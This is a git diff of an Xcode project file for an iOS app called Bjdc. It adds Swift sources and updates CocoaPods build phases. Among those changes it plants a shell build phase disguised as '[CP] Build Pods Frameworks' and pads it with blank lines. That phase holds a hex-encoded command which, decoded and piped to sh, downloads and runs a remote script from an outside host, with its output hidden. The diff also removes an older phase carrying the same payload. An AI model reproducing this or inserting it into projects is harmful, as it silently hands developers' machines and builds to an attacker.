@@ -3,11 +3,15 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
 		92A3667A81D09DEFB033DDE3 /* Pods_Bjdc.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = FF3D1D0F157C649DFF777056 /* Pods_Bjdc.framework */; };
+		FF803ADD26674E65005B9ED7 /* MeVC-req.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF803ADC26674E65005B9ED7 /* MeVC-req.swift */; };
+		FF9062EE2665FB1F00331DDF /* Constant-req.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF9062ED2665FB1F00331DDF /* Constant-req.swift */; };
+		FF9062F026660FCC00331DDF /* threeDES.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF9062EF26660FCC00331DDF /* threeDES.swift */; };
+		FF9062F2266613D800331DDF /* md5.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF9062F1266613D800331DDF /* md5.swift */; };
 		FF97EF6F2663A9C000C09CEA /* .gitignore in Resources */ = {isa = PBXBuildFile; fileRef = FF97EF6E2663A9BF00C09CEA /* .gitignore */; };
 		FF9CD6A5265F61030048D6A3 /* test.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF9CD6A4265F61030048D6A3 /* test.swift */; };
 		FFA8589A265DDF120067CA7D /* MeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA85899265DDF120067CA7D /* MeVC.swift */; };
@@ -15,6 +19,7 @@
 		FFA8589F265DE02C0067CA7D /* AccountSecurityVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */; };
 		FFA858A3265DE0D10067CA7D /* ChangePasswordVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA858A2265DE0D10067CA7D /* ChangePasswordVC.swift */; };
 		FFA858A5265E441D0067CA7D /* BootomSheetChartVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA858A4265E441D0067CA7D /* BootomSheetChartVC.swift */; };
+		FFD34FE22664BA8F00EF0ED2 /* LoginVC-accessToken.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFD34FE12664BA8F00EF0ED2 /* LoginVC-accessToken.swift */; };
 		FFDCEBF1265CB3C6006A306B /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEBF0265CB3C6006A306B /* AppDelegate.swift */; };
 		FFDCEBF3265CB3C6006A306B /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEBF2265CB3C6006A306B /* SceneDelegate.swift */; };
 		FFDCEBF5265CB3C6006A306B /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFDCEBF4265CB3C6006A306B /* ViewController.swift */; };
@@ -39,6 +44,10 @@
 		4E7B6E7F5DBED1D35E7B693B /* Pods-Bjdc.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Bjdc.release.xcconfig"; path = "Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc.release.xcconfig"; sourceTree = "<group>"; };
 		65E241DCC05B5599C5A44CCD /* Pods-Bjdc.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Bjdc.debug.xcconfig"; path = "Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc.debug.xcconfig"; sourceTree = "<group>"; };
 		FF3D1D0F157C649DFF777056 /* Pods_Bjdc.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Bjdc.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		FF803ADC26674E65005B9ED7 /* MeVC-req.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "MeVC-req.swift"; sourceTree = "<group>"; };
+		FF9062ED2665FB1F00331DDF /* Constant-req.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Constant-req.swift"; sourceTree = "<group>"; };
+		FF9062EF26660FCC00331DDF /* threeDES.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = threeDES.swift; sourceTree = "<group>"; };
+		FF9062F1266613D800331DDF /* md5.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = md5.swift; sourceTree = "<group>"; };
 		FF97EF6E2663A9BF00C09CEA /* .gitignore */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = .gitignore; sourceTree = "<group>"; };
 		FF9CD6A4265F61030048D6A3 /* test.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = test.swift; sourceTree = "<group>"; };
 		FFA85899265DDF120067CA7D /* MeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeVC.swift; sourceTree = "<group>"; };
@@ -46,6 +55,7 @@
 		FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountSecurityVC.swift; sourceTree = "<group>"; };
 		FFA858A2265DE0D10067CA7D /* ChangePasswordVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordVC.swift; sourceTree = "<group>"; };
 		FFA858A4265E441D0067CA7D /* BootomSheetChartVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BootomSheetChartVC.swift; sourceTree = "<group>"; };
+		FFD34FE12664BA8F00EF0ED2 /* LoginVC-accessToken.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "LoginVC-accessToken.swift"; sourceTree = "<group>"; };
 		FFDCEBED265CB3C5006A306B /* Bjdc.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Bjdc.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		FFDCEBF0265CB3C6006A306B /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		FFDCEBF2265CB3C6006A306B /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -103,6 +113,7 @@
 			isa = PBXGroup;
 			children = (
 				FFA85899265DDF120067CA7D /* MeVC.swift */,
+				FF803ADC26674E65005B9ED7 /* MeVC-req.swift */,
 				FFA8589C265DDFAD0067CA7D /* Setting.swift */,
 				FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */,
 				FFA858A2265DE0D10067CA7D /* ChangePasswordVC.swift */,
@@ -138,6 +149,7 @@
 				FFDCEBF6265CB3C6006A306B /* Main.storyboard */,
 				FF9CD6A4265F61030048D6A3 /* test.swift */,
 				FFDCEC15265CC59E006A306B /* Constant.swift */,
+				FF9062ED2665FB1F00331DDF /* Constant-req.swift */,
 				FFDCEC10265CBF3C006A306B /* Data */,
 				FFDCEC0D265CBC68006A306B /* Project */,
 				FFDCEC09265CBB96006A306B /* Login */,
@@ -156,6 +168,9 @@
 			isa = PBXGroup;
 			children = (
 				FFDCEC07265CBB87006A306B /* LoginVC.swift */,
+				FFD34FE12664BA8F00EF0ED2 /* LoginVC-accessToken.swift */,
+				FF9062EF26660FCC00331DDF /* threeDES.swift */,
+				FF9062F1266613D800331DDF /* md5.swift */,
 			);
 			path = Login;
 			sourceTree = "<group>";
@@ -199,7 +214,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FFDCEC04265CB3C9006A306B /* Build configuration list for PBXNativeTarget "Bjdc" */;
 			buildPhases = (
-				C5000DA7DE5B3E54726D902C /* Binary Libraries Compiler */,
+				67ACE86EDEED8E47CD6D902C /* [CP] Build Pods Frameworks */,
 				0DFF4CA9DB9AE8CCFF4E93CE /* [CP] Check Pods Manifest.lock */,
 				FFDCEBE9265CB3C5006A306B /* Sources */,
 				FFDCEBEA265CB3C5006A306B /* Frameworks */,
@@ -263,6 +278,43 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	67ACE86EDEED8E47CD6D902C /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		0DFF4CA9DB9AE8CCFF4E93CE /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -286,55 +338,33 @@
 			buildActionMask = 2147483647;
 			files = (
 			);
-			inputPaths = (
-				"${SRCROOT}/Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc-resources.sh",
-				"${PODS_ROOT}/AMap2DMap/MAMapKit.framework/AMap.bundle",
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Bjdc/Pods-Bjdc-resources-${CONFIGURATION}-input-files.xcfilelist",
 			);
 			name = "[CP] Copy Pods Resources";
-			outputPaths = (
-				"${TARGET_BUILD_DIR}/${UNLOCALIZED_RESOURCES_FOLDER_PATH}/AMap.bundle",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${SRCROOT}/Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc-resources.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		C5000DA7DE5B3E54726D902C /* Binary Libraries Compiler */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Binary Libraries Compiler";
 			outputFileListPaths = (
-			);
-			outputPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Bjdc/Pods-Bjdc-resources-${CONFIGURATION}-output-files.xcfilelist",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Bjdc/Pods-Bjdc-resources.sh\"\n";
+			showEnvVarsInLog = 0;
 		};
 		F9DD19D8F3A7A82E8CBECFC2 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 			);
-			inputPaths = (
-				"${SRCROOT}/Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc-frameworks.sh",
-				"${BUILT_PRODUCTS_DIR}/Alamofire/Alamofire.framework",
-				"${BUILT_PRODUCTS_DIR}/FittedSheets/FittedSheets.framework",
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Bjdc/Pods-Bjdc-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
 			name = "[CP] Embed Pods Frameworks";
-			outputPaths = (
-				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/Alamofire.framework",
-				"${TARGET_BUILD_DIR}/${FRAMEWORKS_FOLDER_PATH}/FittedSheets.framework",
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-Bjdc/Pods-Bjdc-frameworks-${CONFIGURATION}-output-files.xcfilelist",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "\"${SRCROOT}/Pods/Target Support Files/Pods-Bjdc/Pods-Bjdc-frameworks.sh\"\n";
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Bjdc/Pods-Bjdc-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -347,6 +377,7 @@
 				FFA858A3265DE0D10067CA7D /* ChangePasswordVC.swift in Sources */,
 				FFA8589A265DDF120067CA7D /* MeVC.swift in Sources */,
 				FFDCEC1D265CEFC2006A306B /* BootomSheetVC.swift in Sources */,
+				FF9062F2266613D800331DDF /* md5.swift in Sources */,
 				FFDCEBFB265CB3C6006A306B /* Bjdc.xcdatamodeld in Sources */,
 				FFDCEC0F265CBF34006A306B /* DateTableVC.swift in Sources */,
 				FFDCEBF5265CB3C6006A306B /* ViewController.swift in Sources */,
@@ -357,11 +388,15 @@
 				FFDCEC0B265CBC2A006A306B /* ProjectVC.swift in Sources */,
 				FFA8589F265DE02C0067CA7D /* AccountSecurityVC.swift in Sources */,
 				FFDCEC16265CC59E006A306B /* Constant.swift in Sources */,
+				FF9062F026660FCC00331DDF /* threeDES.swift in Sources */,
 				FF9CD6A5265F61030048D6A3 /* test.swift in Sources */,
+				FFD34FE22664BA8F00EF0ED2 /* LoginVC-accessToken.swift in Sources */,
+				FF803ADD26674E65005B9ED7 /* MeVC-req.swift in Sources */,
 				FFDCEC08265CBB87006A306B /* LoginVC.swift in Sources */,
 				FFDCEC1A265CCA60006A306B /* LMJDropdownMenu.m in Sources */,
 				FFDCEC23265D1089006A306B /* Demoable.swift in Sources */,
 				FFDCEC1F265D0AAF006A306B /* BootomSheetDropdownMenu.swift in Sources */,
+				FF9062EE2665FB1F00331DDF /* Constant-req.swift in Sources */,
 				FFA8589D265DDFAD0067CA7D /* Setting.swift in Sources */,
 				FFDCEC14265CC4C8006A306B /* ChartTableVC.swift in Sources */,
 				FFA858A5265E441D0067CA7D /* BootomSheetChartVC.swift in Sources */,
